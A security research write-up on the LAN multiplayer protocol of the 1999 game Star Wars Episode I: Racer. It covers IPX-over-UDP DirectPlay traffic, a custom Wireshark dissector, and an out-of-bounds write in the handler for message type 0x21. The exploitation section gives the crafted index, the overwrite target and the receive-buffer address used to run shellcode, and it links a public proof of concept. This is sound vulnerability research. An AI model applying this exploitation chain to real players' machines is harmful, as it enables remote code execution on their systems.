*Star Wars Episode I: Racer* is a racing video game published by LucasArts. The player pilots a podracer, just like in the movie *Star Wars: Episode I – The Phantom Menace*. This article details the multiplayer protocol and a vulnerability allowing remote code execution. We will also cover creating a Wireshark dissector and developing tools with DirectPlay.

## Introduction

*Star Wars Episode I: Racer* is a racing video game developed in 1999 by LucasArts. It is based on the podrace scene from the movie *Star Wars: Episode I – The Phantom Menace*. The research focused on version 1.0 distributed by GOG for the Windows platform. This article details the analysis of the protocol used for local network multiplayer.

![Star Wars Episode I : Racer](https://synacktiv.com/sites/default/files/inline-images/swracer.webp)

*Star Wars Episode I : Racer*

## Network analysis

First, traffic analysis is required. The game is installed on two virtual machines on the same network. The network capture below, displayed with Wireshark, shows the packets sent when a player (at 192.168.56.2) connects to a game host (192.168.56.104).

![Capture wireshark](https://synacktiv.com/sites/default/files/inline-images/wireshark_3.webp)

*Wireshark capture*

The game communicates in multiplayer mode over UDP on destination port 54792. Packets are sent by the client to the broadcast address 192.168.56.255, so every machine on the local network receives them. This is a common mechanism used by video games to discover game instances on a local network. The server then responds to the client with a packet containing the game name.

The capture above does indeed contain a game name *MY Game : (null)*. The subprotocol does not appear to be detected by Wireshark; however, the presence of the string "play" in the packets may indicate the DirectPlay protocol[1](https://synacktiv.com/en/publications/star-wars-episode-i-racer#footnote1_rhitw9h). The source code of the DirectPlay dissector implemented in Wireshark `epan/dissectors/packet-dplay.c` uses this heuristic [1].

```
static bool heur_dissect_dplay(tvbuff_t *tvb, packet_info *pinfo, proto_tree *tree, void *data _U_)
{
    uint32_t dplay_id, token;

    if(tvb_captured_length(tvb) < 25)
        return false;

    /* The string play = 0x706c6179 */
    dplay_id = tvb_get_ntohl(tvb, 20); // [1]
    if( dplay_id == 0x706c6179) {
        dissect_dplay(tvb, pinfo, tree);
        return true;
    }
   [...]
}
```

However, since the string "play" is located at offset 27 rather than offset 20, the DirectPlay protocol is not recognized. Let's try to confirm the use of the DirectPlay protocol through reverse engineering.

### Static analysis of Direct Play usage

Microsoft's DirectPlay API uses the Component Object Model[2](https://synacktiv.com/en/publications/star-wars-episode-i-racer#footnote2_j9ewsfw) (COM). It is a specification that describes an object model and programming requirements enabling COM objects to interact with other objects. In practice, a COM object (also called a component) is identified by a unique identifier known as a CLSID (Class Identifier). The Windows *CoCreateInstance* API allows creating and initializing a COM object by its CLSID. The DirectPlay header file `dplay.h` provides the CLSID for the DirectPlay component as well as the identifiers for the various DirectPlay interfaces.

```
/*
 * GUIDS used by DirectPlay objects
 */
DEFINE_GUID(IID_IDirectPlay2, 0x2b74f7c0, 0x9154, 0x11cf, 0xa9, 0xcd, 0x0, 0xaa, 0x0, 0x68, 0x86, 0xe3);
DEFINE_GUID(IID_IDirectPlay2A,0x9d460580, 0xa822, 0x11cf, 0x96, 0xc, 0x0, 0x80, 0xc7, 0x53, 0x4e, 0x82);

DEFINE_GUID(IID_IDirectPlay3, 0x133efe40, 0x32dc, 0x11d0, 0x9c, 0xfb, 0x0, 0xa0, 0xc9, 0xa, 0x43, 0xcb);
DEFINE_GUID(IID_IDirectPlay3A,0x133efe41, 0x32dc, 0x11d0, 0x9c, 0xfb, 0x0, 0xa0, 0xc9, 0xa, 0x43, 0xcb);

DEFINE_GUID(IID_IDirectPlay4, 0xab1c530, 0x4745, 0x11d1, 0xa7, 0xa1, 0x0, 0x0, 0xf8, 0x3, 0xab, 0xfc);
DEFINE_GUID(IID_IDirectPlay4A,0xab1c531, 0x4745, 0x11d1, 0xa7, 0xa1, 0x0, 0x0, 0xf8, 0x3, 0xab, 0xfc);

// {D1EB6D20-8923-11d0-9D97-00A0C90A43CB}
DEFINE_GUID(CLSID_DirectPlay,0xd1eb6d20, 0x8923, 0x11d0, 0x9d, 0x97, 0x0, 0xa0, 0xc9, 0xa, 0x43, 0xcb);
```

Binary searching in IDA allows locating the CLSID and identifying its usages through cross-references. The pseudocode of the function that instantiates the DirectPlay component is as follows:

```
BOOL DPCreateInstance()
{
  IDirectPlay4::vtable *vftable; // edi
  GUID *guid; // eax

  CoInitialize(pvReserved: nullptr);
  CoCreateInstance(
    rclsid: &rclsid_DirectPlay,
    pUnkOuter: nullptr,
    dwClsContext: 1u,
    riid: &IDirectPlay4,
    ppv: (LPVOID *)&IDirectPlay4A);
  nConnection = 0;
  memset(g_ConnectionInfo, 0, 0x1180u); // [1]
  g_InSession = 0;
  dword_510258 = 0;
  vftable = IDirectPlay4A->vftable;
  guid = (GUID *)getAppGUID();
  return vftable->EnumConnections(self: IDirectPlay4A, guid, callback: EnumConnectionCallback, a4: 0, a5: 0) < 0; // [2]
```

Once the object is initialized, the program zero-initializes an array of *ConnectionInfo_t* structures [1]. This array is then populated indirectly via the `EnumConnections` method, which calls the `EnumConnectionCallback` callback each time a network service provider is found [2].

```
struct ConnectionInfo_t
{
  wchar_t wzShortName[128];
  GUID pGUID;
  void *pOpaqueConnection;
  int dwConnectionSize;
};
```

Each network service provider is identified by a GUID (Globally Unique Identifier). DirectPlay originally provided 4 different network service providers:

| Service Provider | GUID |
| --- | --- |
| Transmission Control Protocol/Internet Protocol (TCP/IP) | {36E95EE0-8577-11cf-960C-0080C7534E82} |
| Internetwork Packet Exchange (IPX) | {685BC400-9D2C-11cf-A9CD-00AA006886E3} |
| Modem | {44EAA760-CB68-11cf-9C4E-00A0C905425E} |
| Serial | {0F1D6860-88D9-11cf-9C4E-00A0C905425E} |

Network service providers are registered in the Windows registry under the key `HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\DirectPlay\Service Providers`.

![Windows Registry](https://synacktiv.com/sites/default/files/inline-images/registry.webp)

*Windows registry*

As shown in the following pseudocode, the program iterates through all installed network service providers and explicitly selects IPX [1]

```
int InitializeIPXConnection()
{
  unsigned int v0; // ebp
  int index; // ebx
  ConnectionInfo_t connectionInfo; // [esp+10h] [ebp-118h] BYREF

  if ( dword_4EB398 != 0 )
    return 0;
  v0 = GetCountConnection();
  index = 0;
  if ( v0 == 0 )
    return 0;
  while ( 1 )
  {
    GetConnectionInfoByIndex(index, info: &connectionInfo);
    if ( memcmp(&connectionInfo.pGUID, &DPSPGUID_IPX, 0x10u) == 0 ) // [1]
      break;
    if ( ++index >= v0 )
      return 0;
  }
  g_ChoosenProvider = index;
  SetProvider(conn: index);
  dword_4EB398 = 1;
  return 1;
}
```

IPX[3](https://synacktiv.com/en/publications/star-wars-episode-i-racer#footnote3_8bqqu0w) is a network communication protocol developed by Novell in the 1980s. It is a connectionless protocol that operates on the network layer of the OSI model (Layer 3). IPX therefore handles the routing and delivery of data packets between different networks. IPX addresses consist of:

- a 32-bit network number
- a 48-bit node number, which defaults to the machine's MAC address
- a socket number that identifies the application or process on the destination node

IPX support was officially discontinued starting with Windows Vista. However, the IPX service provider is specifically installed by the game, as indicated by the script `C:\\GOG Games\\STAR Wars Racer\\directplay-win64.reg`. The game's installation folder contains DLLs from the *ipxwrapper*[4](https://synacktiv.com/en/publications/star-wars-episode-i-racer#footnote4_1a699sk) project. This project emulates IPX by encapsulating packets into UDP datagrams.

- dpwsockx.dll : DirectPlay IPX service provider implementation
- ipxwrapper.dll : Implementation of Windows socket functions
- mswsock.dll : Windows Sockets 2 compatible API (trampoline to ipxwrapper.dll)
- wsock32.dll : Windows Sockets 1.1 compatible API (trampoline to ipxwrapper.dll)

The *ipxwrapper* source code initializes a UDP socket listening on port 54792. According to `src/router.c` ,DirectPlay packets are encapsulated within an *ipx_packet* structure defined in `src/ipxwrapper.h` :

```
struct ipx_packet {
    uint8_t ptype;

    unsigned char dest_net[4];
    unsigned char dest_node[6];
    uint16_t dest_socket;

    unsigned char src_net[4];
    unsigned char src_node[6];
    uint16_t src_socket;

    uint16_t size;
    char data[1];
} __attribute__((__packed__));
```

This information enables us to decode the header of the previously captured game announcement packet:

- ptype (in purple)
- dest_net (0x00000001), dest_node (8E:E0:B5:8C:5E:B2) and dest_socket (in blue)
- src_net (0x00000001), src_node (93:57:94:89:8E:D2) and src_socket (in red)
- size (in green)
- the DirectPlay packet (in yellow)

![Paquet IPX wrapper ](https://synacktiv.com/sites/default/files/inline-images/packet_0.webp)

*IPX Wrapper packet*

The utility `C:\\GOG Games\\STAR Wars Racer\\ipxconfig.exe` allows you to retrieve the machine's IPX configuration. The node address (8E:E0:B5:8C:5E:B2) and the network number match those observed in the previously decoded header.

![IPX Client Config](https://synacktiv.com/sites/default/files/inline-images/ipx-client-config.webp)

*IPX Config utility*

We now have all the information required to decode the IPXwrapper headers. Consequently, we embarked on creating a Wireshark dissector. The DirectPlay dissector (already natively supported) will then be called to decode the data portion of the IPX packets.

## Creating a Wireshark dissector

First, the file `epan/dissectors/packet-ipxwrapper.c` defines a minimalist dissector. Two functions must be implemented : `proto_register_XXX` and `proto_reg_handoff_XXX`, où XXX where `XXX` represents the protocol name, here *ipxwrapper*.

The `hf_register_info` array [1] describes each field of the packet, its size, and the format in which it should be displayed in the graphical user interface.

`proto_register_ipxwrapper` handles registering the protocol along with its metadata, which will appear in the application menus [2]. `register_dissector_with_description` associates the protocol with a dissector. The dissection function `dissect_ipxwrapper` will be called when Wireshark detects the protocol or when the dissector is explicitly invoked using the "Decode As" feature [3].

`register_heur_dissector_list_with_description` creates a list of heuristic dissectors that can be called on the data portion of the IPX packet [4].

```
void proto_register_ipxwrapper(void)
{
  static hf_register_info hf[] = { // [1]
        /* common header fields */
        {&hf_ipx_packet_type,
         {"Packet Type", "ipxwrapper.packet_type", FT_UINT8, BASE_HEX, NULL, 0x0,
          "Packet Type", HFILL}},
        {&hf_ipx_dnet,
         {"Destination Network", "ipxwrapper.dst.net", FT_IPXNET, BASE_NONE, NULL, 0x0,
          NULL, HFILL}},
        [...]
  };
  [...]
    proto_ipxwrapper = proto_register_protocol("IPX Wrapper", /* protocol name */
                                               "IPXWrapper",  /* protocol short name */
                                               "ipxwrapper"   /* protocol filter_name */ 
                                            ); // [2]
    ipxwrapper_handle = register_dissector_with_description(
        "ipxwrapper",           /* dissector name */
        "IPX Wrapper Protocol", /* dissector description */
        dissect_ipxwrapper,     /* dissector function */
        proto_ipxwrapper        /* protocol being dissected */
    ); // [3]

    heur_subdissector_list = register_heur_dissector_list_with_description("ipxwrapper", 
    "IPX Wrapper heuristic", 
    proto_ipxwrapper
    ); // [4]
  [...]
}
```

The function `proto_reg_handoff_ipxwrapper` associates the protocol with UDP traffic on port 54792.

```
void proto_reg_handoff_ipxwrapper(void)
{
    dissector_add_uint("udp.port", 54792, ipxwrapper_handle);
}
```

The dissection function `dissect_ipxwrapper` checks whether the packet is large enough [1]. It then adds the various protocol fields using the `proto_tree_add_item` function [2]. These fields are described in the `hf` array within the `proto_register_ipxwrapper` function.

```
static int
dissect_ipxwrapper(tvbuff_t *tvb, packet_info *pinfo, proto_tree *tree, _U_ void *data)
{

    guint32 offset = 0;
    guint tvb_len = tvb_captured_length(tvb);
    col_set_str(pinfo->cinfo, COL_PROTOCOL, "IPX");

    if (tvb_len < (1 + 4 + 6 + 2 + 4 + 6 + 2)) //  [1]
    {
        col_add_fstr(pinfo->cinfo, COL_INFO, "truncated IPX (%u bytes)", tvb_len);
        return tvb_len;
    }

    col_clear(pinfo->cinfo, COL_INFO);

    proto_item *ti = proto_tree_add_item(tree, proto_ipxwrapper, tvb, 0, -1, ENC_NA);
    proto_tree *ipx_tree = proto_item_add_subtree(ti, ett_ipxwrapper);

    proto_tree_add_item(ipx_tree, hf_ipx_packet_type, tvb, offset, 1, ENC_LITTLE_ENDIAN); // [2]
    offset += 1;

    proto_tree_add_item(ipx_tree, hf_ipx_dnet, tvb, offset, 4, ENC_BIG_ENDIAN);
    offset += 4;
    [...]
    tvbuff_t *next_tvb = tvb_new_subset_remaining(tvb, offset);

    heur_dtbl_entry_t* hdtbl_entry = NULL;
    if(!dissector_try_heuristic(heur_subdissector_list, next_tvb, pinfo, tree, &hdtbl_entry, data)) // [3]
    {
        call_data_dissector(next_tvb, pinfo, tree);
    }

    return tvb_captured_length(tvb);
}
```

Finally, the DirectPlay dissector must be called on the data payload. However, the DirectPlay protocol only registers heuristic dissectors for a specific protocol. The `heur_dissector_add` method adds a dissector to the list of heuristic dissectors previously initialized in the` packet-ipxwrapper.c `file

```
void proto_reg_handoff_dplay(void)
{
    heur_dissector_add("udp", heur_dissect_dplay, "DirectPlay over UDP", "dplay_udp", proto_dplay, HEURISTIC_DISABLE);
    heur_dissector_add("tcp", heur_dissect_dplay, "DirectPlay over TCP", "dplay_tcp", proto_dplay, HEURISTIC_DISABLE);
    heur_dissector_add("ipxwrapper", heur_dissect_dplay, "DirectPlay over IPX", "dplay_ipx", proto_dplay, HEURISTIC_DISABLE); // [1]
}
```

Despite this, Wireshark still does not seem to recognize the DirectPlay packets. This is a current limitation of the software: only packets using the *DirectPlay 4 Reliable Protocol*[5](https://synacktiv.com/en/publications/star-wars-episode-i-racer#footnote5_dunr5xg) are recognized. As specified in the documentation, fields marked as optional are only present if the DPSESSION_DIRECTPLAYPROTOCOL (0x2000) flag is used during session creation.

![Direct Play Header](https://synacktiv.com/sites/default/files/inline-images/directplayheader.webp)

*Direct Play Header*

Although the DirectPlay interface's `Open` method is called with a session description containing this flag, a function further along explicitly disables this setting [1].

```
int __cdecl sub_486FC0(int a1, DWORD maxPlayer, int unknownBool)
{
  int v3; // edi
  LPDPSESSIONDESC2 session; // esi
  DWORD flags; // eax
  const wchar_t *lpszSessionName; // edx
  wchar_t *v7; // eax
  DWORD dwSize; // [esp+14h] [ebp-104h] BYREF
  wchar_t Destination[128]; // [esp+18h] [ebp-100h] BYREF

  v3 = 0;
  if ( IDirectPlay4A->vftable->GetSessionDesc(a1: IDirectPlay4A, a2: nullptr, a3: &dwSize) == 0x8877001E )
  {
    session = (LPDPSESSIONDESC2)(*(int (__cdecl **)(DWORD))(allocator + 32))(a1: dwSize);
    if ( session == nullptr || IDirectPlay4A->vftable->GetSessionDesc(a1: IDirectPlay4A, a2: session, a3: &dwSize) < 0 )
      goto LABEL_10;
    flags = session->dwFlags;
    LOBYTE(flags) = unknownBool != 0 ? flags & 0xDF : flags | DPSESSION_JOINDISABLED; // [1]
    lpszSessionName = session->lpszSessionName;
    session->dwFlags = flags;
    wcsncpy(Destination, Source: lpszSessionName, Count: 0x7Fu);
    Destination[127] = 0;
    v7 = wcsrchr(Str: Destination, Ch: 0x3Au);
    if ( v7 == nullptr
      || (_snwprintf(Buffer: v7 + 1, BufferCount: 0x20u, Format: L"%S", a1),
          session->lpszSessionName = Destination,
          session->dwMaxPlayers = maxPlayer,
          ((int (__stdcall *)(IDirectPlay4 *, LPDPSESSIONDESC2, _DWORD))IDirectPlay4A->vftable->SetSessionDesc)(
            a1: IDirectPlay4A,
            a2: session,
            a3: 0) < 0) )
    {
LABEL_10:
      v3 = 1;
    }
  }
  else
  {
    session = (LPDPSESSIONDESC2)dwSize;
    v3 = 1;
  }
  (*(void (__cdecl **)(LPDPSESSIONDESC2))(allocator + 36))(a1: session);
  return v3;
}
```

A few modifications were made to the DirectPlay dissector to handle packets without the optional headers. Below is a network capture correctly decoded by Wireshark.

![Dissecteur wireshark](https://synacktiv.com/sites/default/files/inline-images/ipx-wrapper-dissect.webp)

*Wireshark dissector*

## Static analysis of packet processing

Next, we will focus on processing application-specific DirectPlay packets. DirectPlay messages are received via the `Receive` method of the *IDirectPlay4A* interface. This method can return the DPERR_NOMESSAGES error code (0x887700BE), which is often handled by programs using DirectPlay. The function calling `Receive` was located by searching for the aforementioned constant [1].

```
int __cdecl DPReceive(DPID *dpIdFrom, _DWORD *data, DWORD *dwDataSize_idTo)
{
  DWORD *lpDataSize; // ebx
  int v4; // eax
  int result; // eax

  lpDataSize = dwDataSize_idTo;
  v4 = IDirectPlay4A->vftable->Receive(
         this: IDirectPlay4A,
         lpidFrom: dpIdFrom,
         lpidTo: (DPID *)&dwDataSize_idTo,
         dwFlags: 1,
         lpData: data,
         lpdwDataSize: dwDataSize_idTo);
  if ( v4 < 0 )
    return (v4 == 0x887700BE) - 2; // [1]
  while ( *dpIdFrom == DPID_SYSMSG )
  {
    result = HandleSysMessage(message: data, playerIdOrGroup: dpIdFrom);
    if ( result != -1 )
      return result;
    v4 = IDirectPlay4A->vftable->Receive(
           this: IDirectPlay4A,
           lpidFrom: dpIdFrom,
           lpidTo: (DPID *)&dwDataSize_idTo,
           dwFlags: 1,
           lpData: data,
           lpdwDataSize: lpDataSize);
    if ( v4 < 0 )
      return (v4 == 0x887700BE) - 2;
  }
  return 0;
}
```

The `HandleSysMessage` function partially processes system messages, these messages are designed to manage game session events. The structure of each system message is defined in the DirectPlay headers, unlike user messages, which are defined by the application.

- DPSYS_CREATEPLAYERORGROUP : sent when a player or group is created
- DPSYS_DESTROYPLAYERORGROUP : sent when a player or group is removed
- DPSYS_SESSIONLOST : sent if the DirectPlay object loses connection with all other players in the session
- DPSYS_HOST : sent when the game host leaves the session, making the current DirectPlay instance the new game host

The function handling user messages was located by tracing back the call to the `Receive` method. Message types 0x21, 0x22, 0x28 et 0x20 are processed when the player has not yet fully joined the game, as shown in the pseudocode at [1]. While the initial connection steps are handled using the DirectPlay API, the game also maintains its own player state and implements specific messages to add and remove players.

```
int sub_41B7F0()
{
  int v0; // esi
  int result; // eax

  v0 = 0;
  result = sub_41D6B0();
  if ( result != 0 )
  {
    if ( dword_4E9EB0 != 0 )
    {
      dword_4E9EA8 = 0;
      do
      {
        if ( DequeuePacket(id: &txrx_packet) != 1 )
          break;
        ++v0;
        if ( txrx_packet.dpId != 0 )
        {
          if ( GetPlayerNumFromDPID(dpId: txrx_packet.dpId) >= 0
            || txrx_packet.buffer.generic.wMsgId == 0x21
            || txrx_packet.buffer.generic.wMsgId == 0x22
            || txrx_packet.buffer.generic.wMsgId == 0x28
            || txrx_packet.buffer.generic.wMsgId == 0x20 ) // [1]
          {
            if ( txrx_packet.buffer.generic.sequenceNum == 0
              || (sub_41B960(a1: txrx_packet.dpId, a2: txrx_packet.buffer.generic.sequenceNum),
                  CheckDuplicatePacket(dpId: txrx_packet.dpId, a2: txrx_packet.buffer.generic.sequenceNum) == 0) )
            {
              CallNetworkHandler(pkt: &txrx_packet);
            }
          }
```

Checking the packet's `wMsgId` field indicates that there are theoretically 100 different message handlers [1].  However, only 26 entries in the *network_handlers_table* array are initialized.

```
int __cdecl CallNetworkHandler(RxPacket_t *pkt)
{
  unsigned int wMsgId; // eax
  CALLBACK_RX callback; // eax

  wMsgId = (unsigned __int16)pkt->buffer.generic.wMsgId;
  if ( (unsigned __int16)wMsgId < 100u && // [1]
      (callback = network_handlers_table[wMsgId]) != nullptr )
    return callback(packet: pkt);
  else
    return 1;
}
```

## Vulnerability

The function processing type 0x21 packets contains an *out-of-bounds write* vulnerability. First, an `iIndex` integer is retrieved from the network packet [1]. The program then copies a UTF-16 string using `wcsncpy` into the `wzName` member of a *STATE_T* structure selected by the index. An index greater than or equal to 20 will cause a write outside the bounds of the `_g_PlayerStates `array.

```
int __cdecl Handler_21h(RxPacket_t *packet)
{
  int index; // esi

  index = packet->buffer.message_21h.iIndex; // [1]
  wcsncpy(
     Destination: _g_PlayerStates[index].wzName,  // [2]
     Source: packet->buffer.message_21h.wzName,
     Count: 0xFu );
  _g_PlayerStates[index].wzName[15] = 0;
  return 1;
}
```

## Exploitation

A minimalist DirectPlay-based server was written to send a specifically crafted message to the client. First, an instance of a DirectPlay object must be retrieved using the `CoCreateInstance6` API.

```
hr = CoCreateInstance(CLSID_DirectPlay, NULL, CLSCTX_INPROC_SERVER, IID_IDirectPlay4, (LPVOID *)&lpDirectPlay4);
```

Next, the program selects the IPX network service provider using the `EnumConnection` and `InitializeConnection`methods. The IPXwrapper DLLs must be placed in the server's execution directory. The server then creates a session via the `Open`method [1]. The first parameter is a session descriptor specifying the maximum number of allowed players, the game name, and the `guidApplication`. This unique identifier must match the game ID for *Star Wars Racer*: {C95FB584-FA31-11D2-909D00AA00A322AD}. A player is created using the `CreatePlayer` method. An event object is created and will be signaled whenever a message intended for this player is received. The core message processing is handled inside the `ReceiveLoop` function [3].

```
  WCHAR sessionName[1024] = {0};
  wcscpy(sessionName, L"Test session");
  ZeroMemory(&sessionDesc, sizeof(DPSESSIONDESC2));
  sessionDesc.dwSize = sizeof(DPSESSIONDESC2);
  sessionDesc.dwFlags = DPSESSION_KEEPALIVE | DPSESSION_NODATAMESSAGES | DPSESSION_MIGRATEHOST;
  sessionDesc.guidApplication = GUID_StarWarsRacer;
  sessionDesc.dwMaxPlayers = 20;
  sessionDesc.lpszSessionName = sessionName;
  sessionDesc.dwUser3 = 1;
  sessionDesc.dwUser4 = 0xB4;
  sessionDesc.dwUser1 = 0x80000000;
  printf("[i] Hosting game ...\n");
  hr = lpDirectPlay4->Open(&sessionDesc, DPOPEN_CREATE); // [1]
  if (!SUCCEEDED(hr))
  {
      fprintf(stderr, "Open failed (0x%08.8x)\n", hr);
      return -1;
  }

  DPNAME dpName;
  WCHAR lpszPlayerName[256];
  wcscpy(lpszPlayerName, L"Player");
  ZeroMemory(&dpName, sizeof(DPNAME));
  dpName.dwSize = sizeof(DPNAME);
  dpName.lpszShortName = lpszPlayerName;

  HANDLE hPlayerEvent = CreateEvent(NULL,  // no security
                                  FALSE, // auto reset
                                  FALSE, // initial event reset
                                  NULL); // no name

  printf("[i] CreatePlayer ...\n");
  hr = lpDirectPlay4->CreatePlayer(&g_DPIDHostPlayer, &dpName, hPlayerEvent, NULL, 0, 0); // [2]
  if (!SUCCEEDED(hr))
  {
      fprintf(stderr, "CreatePlayer failed (0x%08.8x)\n", hr);
      return -1;
  }

  ReceiveLoop(lpDirectPlay4, hPlayerEvent); // [3]
```

This function waits for a message from the DirectPlay object using the `WaitForMultipleObjects7` API [1]. The message is retrieved via the `Receive`method, which returns the sender's identifier. The application must handle two types of messages: system messages, where the sender ID is DPID_SYSMSG , and custom messages specific to *Star Wars Episode I: Racer*.

```cpp

VOID ReceiveLoop(LPDIRECTPLAY4 lpDirectPlay4A, HANDLE hPlayerEvent)
{
    DPID idTo, idFrom;
    LPVOID lpvMsgBuffer;
    DWORD dwMsgBufferSize;
    HRESULT hr;

    lpvMsgBuffer = NULL;
    dwMsgBufferSize = 0;

    HANDLE eventHandles[2];
    eventHandles[0] = hPlayerEvent;

    while (WaitForMultipleObjects(1, eventHandles, FALSE, INFINITE) == WAIT_OBJECT_0) // [1]
    {
        idFrom = 0;
        idTo = 0;
        hr = lpDirectPlay4A->Receive(&idFrom, &idTo, DPRECEIVE_ALL, lpvMsgBuffer, &dwMsgBufferSize);
        if (hr == DPERR_BUFFERTOOSMALL)
        {
            if (lpvMsgBuffer)
                free(lpvMsgBuffer);
            lpvMsgBuffer = malloc(dwMsgBufferSize);
            hr = lpDirectPlay4A->Receive(&idFrom, &idTo, DPRECEIVE_ALL, lpvMsgBuffer, &dwMsgBufferSize);
        }

        if (!SUCCEEDED(hr))
        {
            printf("Receive error : %08.8x\n", hr);
            break;
        }

        if (idFrom == DPID_SYSMSG)
        {
            HandleSystemMessage(lpDirectPlay4A, (LPDPMSG_GENERIC)lpvMsgBuffer, dwMsgBufferSize, idFrom, idTo);
        }
        else
        {
            [...]
        }
    }
}
```

System messages always begin with a DWORD indicating the message type, with the remaining fields defined according to that type. The server application must handle the DPSYS_CREATEPLAYERORGROUP system message. When a player connects, the server saves their ID to send the payload later. Initially, the server responds with a proprietary type 0x20 message containing the list of active players in the game session.

![Packet 20h](https://synacktiv.com/sites/default/files/inline-images/packet_20h.webp)

*Message type 0x20*

Exploitation is triggered when the target player sends a type 0x22 message. This message is sent by the client after connecting and again contains the player's name.

The exploit works by responding with a type 0x21 message that overwrites a handler in the `network_handlers_table `array. Setting the index to `0x01737B26` targets the address` 0x004E9DE4 `, which corresponds to the handler for message 0x33. The handler is replaced with `0xEC7BC8`, which corresponds to the receive buffer address.

![Packet 21h](https://synacktiv.com/sites/default/files/inline-images/packet_21h.webp)

*Payload type 0x21*

A second type 0x33 message containing shellcode is sent, causing the program to execute the code received in the packet.

## Conclusion

We exploited this vulnerability in a Windows 10 test environment (version 10.0.19045.2965). The Proof of Concept (PoC) is available for educational purposes at the following link: [https://github.com/synacktiv/SWEP1RCR-exploit](https://github.com/synacktiv/SWEP1RCR-exploit)

- 1. https://winprotocoldoc.z19.web.core.windows.net/MC-DPL4CS/%5BMC-DPL4CS%…
- 2. https://learn.microsoft.com/fr-fr/windows/win32/com/the-component-objec…
- 3. https://en.wikipedia.org/wiki/Internetwork_Packet_Exchange
- 4. https://github.com/solemnwarning/ipxwrapper
- 5. https://winprotocoldoc.z19.web.core.windows.net/MC-DPL4R/%5BMC-DPL4R%5D…
- 6. https://learn.microsoft.com/fr-fr/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance
- 7. https://learn.microsoft.com/fr-fr/windows/win32/api/synchapi/nf-synchapi-waitformultipleobjects